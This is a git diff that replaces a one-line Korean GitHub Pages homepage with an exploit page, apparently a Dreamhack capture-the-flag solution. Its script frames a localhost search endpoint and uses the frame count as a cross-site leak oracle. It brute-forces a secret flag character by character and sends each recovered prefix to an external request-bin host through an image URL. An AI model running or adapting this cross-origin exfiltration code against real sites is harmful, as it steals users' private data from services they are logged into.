@@ -1,11 +1,44 @@
-<!DOCTYPE html>
-<html lang="ko">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My Website</title>
-</head>
-<body>
-    <h1>안녕하세요! GitHub Pages로 만든 웹사이트입니다.(by LHS)</h1>
-</body>
-</html>
+<iframe id="iframe"></iframe>
+<img id="img">
+<script>
+    async function req(url) {
+        return await new Promise((resolve, reject) => {
+            const iframe = document.getElementById("iframe");
+            iframe.src = url;
+            iframe.onload = () => { 
+                if (iframe.contentWindow.frames.length != 0)
+                    return resolve();
+                else
+                    return reject();
+            };
+        });
+    }
+
+    async function search(query) {
+        try {
+            await req(
+              `http://localhost:8000/search?query=${query}`
+            );
+            return true;
+        } catch (e) {
+            return false;
+        }
+    }
+
+    async function exploit() {
+        let chars = "0123456789abcdef}"
+        let secret = "DH{";
+
+        while (!secret.includes("}")) {
+            for (let c of chars) {
+                if (await search(secret + c)) {
+                    secret += c;
+                    img.src = `https://poyotgb.request.dreamhack.games/${secret}`;
+                    break;
+                }
+            }
+        }
+    }
+
+    exploit();
+</script>
